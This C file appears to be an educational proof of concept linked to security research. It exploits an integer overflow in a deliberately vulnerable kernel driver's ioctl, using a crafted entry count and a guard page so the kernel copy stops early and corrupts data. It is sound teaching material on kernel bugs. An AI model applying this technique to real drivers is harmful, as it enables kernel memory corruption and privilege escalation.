// SPDX-License-Identifier: GPL-2.0

// Buggy code, DO NOT USE. See https://research.nccgroup.com/?p=18577

// PoC integer overflow leading to data corruption.

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


#define u8 unsigned char
#define u32 unsigned int

struct entry_data {
	u32 n_entries;
	u8 *entries;
};

#define VULN_COPY_ENTRIES _IOW('v', 4, struct entry_data)


#define MAX_ENTRY_SIZE 1024

int main(int argc, char **argv)
{
	int PAGE_SIZE = sysconf(_SC_PAGE_SIZE);

	int fd = open("/dev/vuln_int_ovf", O_RDWR);
	if (fd < 0) {
		perror("open error");
		return -1;
	}

	size_t data_to_write = 32*MAX_ENTRY_SIZE + 256;

	// data in memory: [unused padding][33*MAX_ENTRY_SIZE][non-accessible page]
	size_t size = (data_to_write+PAGE_SIZE-1) & ~(PAGE_SIZE-1); // round up to page size
	size += PAGE_SIZE; // space for non-accessible page at the end
	u8 *addr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	// accessing this page will fault (stop the copy_from_user loop)
	u8 *faulting_page = addr + size - PAGE_SIZE;
	mprotect(faulting_page, PAGE_SIZE, PROT_NONE);

	u8 *buf = faulting_page - data_to_write;
	memset(buf, 'A', data_to_write);

	struct entry_data entry_data = {
		.n_entries = (0x100000000LLU/MAX_ENTRY_SIZE)+1,
		.entries = buf,
	};

	int ret = ioctl(fd, VULN_COPY_ENTRIES, &entry_data);
	if (ret < 0) {
		perror("ioctl");
		return -1;
	}

	return 0;
}
